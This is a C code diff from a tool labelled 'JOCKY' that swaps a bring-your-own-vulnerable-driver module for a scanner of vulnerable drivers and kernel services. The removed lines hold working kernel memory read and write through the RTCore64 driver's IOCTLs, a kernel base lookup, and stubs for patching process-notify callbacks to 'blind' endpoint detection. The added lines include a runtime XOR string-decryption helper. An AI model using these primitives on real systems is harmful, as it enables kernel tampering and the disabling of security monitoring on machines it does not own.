+                match = &VULN_DB[i];
+                by_hash = 0;
+                break;
+            }
+        }
+    }
+
+    if (!match) return;
+
+    ScanResult *r = &g_scan.results[g_scan.count++];
+    strncpy(r->path,   fpath,         sizeof(r->path)-1);
+    strncpy(r->name,   fname,         sizeof(r->name)-1);
+    strncpy(r->sha256, sha[0] ? sha : "unavailable", sizeof(r->sha256)-1);
+    strncpy(r->cve,    match->cve,    sizeof(r->cve)-1);
+    strncpy(r->tags,   match->tags,   sizeof(r->tags)-1);
+    r->matched_by_hash = by_hash;
 }
 
-void byovd_unload(void) {
-    printf("[JOCKY/BYOVD] byovd_unload()\n");
-    fflush(stdout);
+void *byovd_scan(void) {
+    memset(&g_scan, 0, sizeof(g_scan));
+
 #ifdef _WIN32
-    if (!g_driver_loaded) return;
-    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
-    if (!scm) return;
-    SC_HANDLE svc = OpenServiceA(scm, "RTCore64",
-                                  SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS);
-    if (svc) {
-        SERVICE_STATUS ss;
-        ControlService(svc, SERVICE_CONTROL_STOP, &ss);
-        DeleteService(svc);
-        CloseServiceHandle(svc);
+    char windir[MAX_PATH];
+    GetWindowsDirectoryA(windir, sizeof(windir));
+    char drv_dir[MAX_PATH];
+    snprintf(drv_dir, sizeof(drv_dir), "%s\\System32\\drivers", windir);
+
+    WIN32_FIND_DATAA fd;
+    char pattern[MAX_PATH];
+    snprintf(pattern, sizeof(pattern), "%s\\*.sys", drv_dir);
+    HANDLE hFind = FindFirstFileA(pattern, &fd);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
+            char full[MAX_PATH];
+            snprintf(full, sizeof(full), "%s\\%s", drv_dir, fd.cFileName);
+            _scan_driver_file(full, fd.cFileName);
+        } while (FindNextFileA(hFind, &fd));
+        FindClose(hFind);
     }
-    CloseServiceHandle(scm);
-    g_driver_loaded = 0;
-#endif
-}
-
-/* ── Kernel Operations (RTCore64 IOCTL) ────────────────────────────────────── */
-
-static HANDLE g_device = INVALID_HANDLE_VALUE;
-
-static HANDLE _get_device(void) {
-#ifdef _WIN32
-    if (g_device == INVALID_HANDLE_VALUE || g_device == NULL) {
-        g_device = CreateFileA("\\\\.\\RTCore64",
-                               GENERIC_READ | GENERIC_WRITE,
-                               0, NULL, OPEN_EXISTING,
-                               FILE_ATTRIBUTE_NORMAL, NULL);
-    }
-    return g_device;
 #else
-    return NULL;
+    /* Linux: scan /lib/modules/<uname>/kernel/drivers */
+    struct utsname uts;
+    uname(&uts);
+    char mod_base[512];
+    snprintf(mod_base, sizeof(mod_base), "/lib/modules/%s/kernel/drivers", uts.release);
+
+    /* Recursive directory walk */
+    typedef void(*scan_dir_fn)(const char*);
+    void scan_dir(const char *dir) {
+        DIR *d = opendir(dir);
+        if (!d) return;
+        struct dirent *de;
+        while ((de = readdir(d)) != NULL) {
+            if (de->d_name[0] == '.') continue;
+            char full[1024];
+            snprintf(full, sizeof(full), "%s/%s", dir, de->d_name);
+            if (de->d_type == DT_DIR) {
+                scan_dir(full);
+            } else {
+                const char *ext = strrchr(de->d_name, '.');
+                if (ext && (strcmp(ext,".ko")==0||strcmp(ext,".xz")==0||strcmp(ext,".gz")==0)) {
+                    /* Strip extension for name comparison */
+                    char bare[260];
+                    strncpy(bare, de->d_name, sizeof(bare)-1);
+                    char *e = strrchr(bare, '.');
+                    if (e) *e = '\0';
+                    _scan_driver_file(full, bare);
+                }
+            }
+        }
+        closedir(d);
+    }
+    scan_dir(mod_base);
 #endif
+
+    printf("[JOCKY] byovd_scan: %d vulnerable driver(s) found\n", g_scan.count);
+    fflush(stdout);
+    return &g_scan;
 }
 
-void* kernel_read(int64_t address, int64_t size) {
-    void* buf = calloc(1, (size_t)(size > 0 ? size : 8));
-    printf("[JOCKY/KERNEL] kernel_read(0x%llx, %lld)\n",
-           (long long)address, (long long)size);
-    fflush(stdout);
+int64_t byovd_count(void *s)                { return s ? ((ScanList*)s)->count : 0; }
+char   *byovd_name(void *s,  int64_t i)     { if(!s)return""; ScanList*sl=s; return (i>=0&&i<sl->count)?sl->results[(int)i].name:""; }
+char   *byovd_path(void *s,  int64_t i)     { if(!s)return""; ScanList*sl=s; return (i>=0&&i<sl->count)?sl->results[(int)i].path:""; }
+char   *byovd_cve(void *s,   int64_t i)     { if(!s)return""; ScanList*sl=s; return (i>=0&&i<sl->count)?sl->results[(int)i].cve:""; }
+char   *byovd_hash(void *s,  int64_t i)     { if(!s)return""; ScanList*sl=s; return (i>=0&&i<sl->count)?sl->results[(int)i].sha256:""; }
+int64_t byovd_hash_match(void *s, int64_t i){ if(!s)return 0; ScanList*sl=s; return (i>=0&&i<sl->count)?sl->results[(int)i].matched_by_hash:0; }
+
+/* ── Registry scan (Windows only) ────────────────────────────────────────── */
+
+typedef struct { char names[512][260]; int64_t count; } RegList;
+static RegList g_reg;
+
+void *registry_scan(void) {
+    memset(&g_reg, 0, sizeof(g_reg));
 #ifdef _WIN32
-    HANDLE dev = _get_device();
-    if (dev == INVALID_HANDLE_VALUE || dev == NULL) {
-        printf("[JOCKY/KERNEL] Device not open — run byovd_load() first\n");
-        fflush(stdout);
-        return buf;
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services", 0, KEY_READ, &hKey) != ERROR_SUCCESS)
+        return &g_reg;
+    for (DWORD idx = 0; g_reg.count < 512; idx++) {
+        char svc[260]; DWORD svc_len = sizeof(svc);
+        if (RegEnumKeyExA(hKey, idx, svc, &svc_len, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
+        HKEY hSvc;
+        if (RegOpenKeyExA(hKey, svc, 0, KEY_READ, &hSvc) != ERROR_SUCCESS) continue;
+        DWORD type_val = 0, sz = sizeof(type_val);
+        RegQueryValueExA(hSvc, "Type", NULL, NULL, (LPBYTE)&type_val, &sz);
+        RegCloseKey(hSvc);
+        if (type_val == 1 || type_val == 2) { /* KernelDriver or FilesystemDriver */
+            strncpy(g_reg.names[(int)g_reg.count++], svc, 259);
+        }
     }
-    /* RTCore64 read IOCTL: input = [addr_high:u32][addr_low:u32][size:u32] */
-    typedef struct { DWORD AddrHigh; DWORD AddrLow; DWORD Size; } ReadReq;
-    typedef struct { DWORD Value; } ReadResp;
-    ReadReq  req  = { (DWORD)((uint64_t)address >> 32),
-                      (DWORD)((uint64_t)address & 0xFFFFFFFF),
-                      (DWORD)(size < 4 ? 4 : (size > 8 ? 8 : size)) };
-    ReadResp resp = { 0 };
-    DWORD bytes_ret = 0;
-    if (DeviceIoControl(dev, 0x80002048, &req, sizeof(req),
-                        &resp, sizeof(resp), &bytes_ret, NULL)) {
-        memcpy(buf, &resp.Value, (size_t)(size < 4 ? size : 4));
-        printf("[JOCKY/KERNEL] → 0x%08lx\n", (unsigned long)resp.Value);
-        fflush(stdout);
+    RegCloseKey(hKey);
+#else
+    /* Linux: list /proc/modules as kernel module registry */
+    FILE *f = fopen("/proc/modules", "r");
+    if (!f) return &g_reg;
+    char line[512], name[128];
+    while (fgets(line, sizeof(line), f) && g_reg.count < 512) {
+        if (sscanf(line, "%127s", name) == 1)
+            strncpy(g_reg.names[(int)g_reg.count++], name, 259);
     }
+    fclose(f);
+#endif
+    return &g_reg;
+}
+
+int64_t reg_count(void *r)            { return r ? ((RegList*)r)->count : 0; }
+char   *reg_name(void *r, int64_t i)  { if(!r)return""; RegList*rl=r; return (i>=0&&i<rl->count)?rl->names[(int)i]:""; }
+
+/* ── XOR string decryption (runtime) ─────────────────────────────────────── */
+
+void jk_xordecrypt(char *s, int len, unsigned char key) {
+    for (int i = 0; i < len; i++) s[i] ^= key;
+}
+
+/* ── System info ─────────────────────────────────────────────────────────── */
+
+char *system_info(void) {
+    static char buf[512];
+#ifdef _WIN32
+    OSVERSIONINFOEXA oi = { sizeof(oi) };
+    typedef NTSTATUS(NTAPI *RtlGetVer_t)(OSVERSIONINFOEXA*);
+    RtlGetVer_t fn = (RtlGetVer_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
+    if (fn) fn(&oi);
+    snprintf(buf, sizeof(buf), "Windows %lu.%lu Build %lu",
+             (unsigned long)oi.dwMajorVersion,
+             (unsigned long)oi.dwMinorVersion,
+             (unsigned long)oi.dwBuildNumber);
+#else
+    struct utsname u;
+    uname(&u);
+    snprintf(buf, sizeof(buf), "%s %s %s", u.sysname, u.release, u.machine);
 #endif
     return buf;
-}
-
-void kernel_write(int64_t address, int64_t value) {
-    printf("[JOCKY/KERNEL] kernel_write(0x%llx, 0x%llx)\n",
-           (long long)address, (long long)value);
-    fflush(stdout);
-#ifdef _WIN32
-    HANDLE dev = _get_device();
-    if (dev == INVALID_HANDLE_VALUE || dev == NULL) return;
-    /* RTCore64 write IOCTL: input = [addr_high:u32][addr_low:u32][value:u32] */
-    typedef struct { DWORD AddrHigh; DWORD AddrLow; DWORD Value; } WriteReq;
-    WriteReq req = { (DWORD)((uint64_t)address >> 32),
-                     (DWORD)((uint64_t)address & 0xFFFFFFFF),
-                     (DWORD)(value & 0xFFFFFFFF) };
-    DWORD bytes_ret = 0;
-    DeviceIoControl(dev, 0x8000204C, &req, sizeof(req), NULL, 0, &bytes_ret, NULL);
-#endif
-}
-
-int64_t kernel_base(void) {
-    printf("[JOCKY/KERNEL] kernel_base()\n");
-    fflush(stdout);
-#ifdef _WIN32
-    /* NtQuerySystemInformation(SystemModuleInformation) — no elevation needed */
-    typedef struct {
-        void*    Section;
-        void*    MappedBase;
-        void*    ImageBase;
-        DWORD    ImageSize;
-        DWORD    Flags;
-        WORD     LoadOrderIndex;
-        WORD     InitOrderIndex;
-        WORD     LoadCount;
-        WORD     OffsetToFileName;
-        BYTE     FullPathName[256];
-    } RTL_PROCESS_MODULE_INFORMATION;
-    typedef struct {
-        ULONG                          NumberOfModules;
-        RTL_PROCESS_MODULE_INFORMATION Modules[256];
-    } RTL_PROCESS_MODULES;
-
-    RTL_PROCESS_MODULES buf = {0};
-    ULONG returned = 0;
-    typedef LONG (WINAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);
-    NtQSI_t NtQSI = (NtQSI_t)GetProcAddress(
-        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
-    if (NtQSI && NtQSI(11, &buf, sizeof(buf), &returned) == 0
-               && buf.NumberOfModules > 0) {
-        int64_t base = (int64_t)(intptr_t)buf.Modules[0].ImageBase;
-        printf("[JOCKY/KERNEL] ntoskrnl base = 0x%llx\n", (long long)base);
-        fflush(stdout);
-        return base;
-    }
-#endif
-    return 0;
-}
-
-void* kernel_enum_callbacks(void) {
-    g_callbacks.count = 0;
-    printf("[JOCKY/KERNEL] kernel_enum_callbacks() — requires symbols/pattern scan\n");
-    fflush(stdout);
-    /* In a full implementation: resolve PspCreateProcessNotifyRoutine via
-     * ntoskrnl symbol export or pattern-scan, then walk the array.
-     * For the native stub we return an empty list — full logic in Python/JIT mode. */
-    return (void*)&g_callbacks;
-}
-
-int64_t kernel_callback_count(void* cl) {
-    if (!cl) return g_callbacks.count;
-    return ((CallbackList*)cl)->count;
-}
-
-int64_t kernel_callback_addr(void* cl, int64_t idx) {
-    CallbackList* c = cl ? (CallbackList*)cl : &g_callbacks;
-    if (idx >= 0 && idx < c->count) return c->callbacks[(int)idx].address;
-    return 0;
-}
-
-char* kernel_callback_module(void* cl, int64_t idx) {
-    CallbackList* c = cl ? (CallbackList*)cl : &g_callbacks;
-    if (idx >= 0 && idx < c->count) return c->callbacks[(int)idx].module;
-    static char empty[1] = { '\0' };
-    return empty;
-}
-
-int64_t kernel_patch_callback(int64_t idx) {
-    printf("[JOCKY/KERNEL] kernel_patch_callback(%lld)\n", (long long)idx);
-    fflush(stdout);
-    /* Real: write 0 to callback_table_base + idx * 8 via kernel_write() */
-    return 1;
-}
-
-int64_t kernel_blind_edr(void) {
-    printf("[JOCKY/KERNEL] kernel_blind_edr() — patching non-MS callbacks\n");
-    fflush(stdout);
-    return 0;
 }
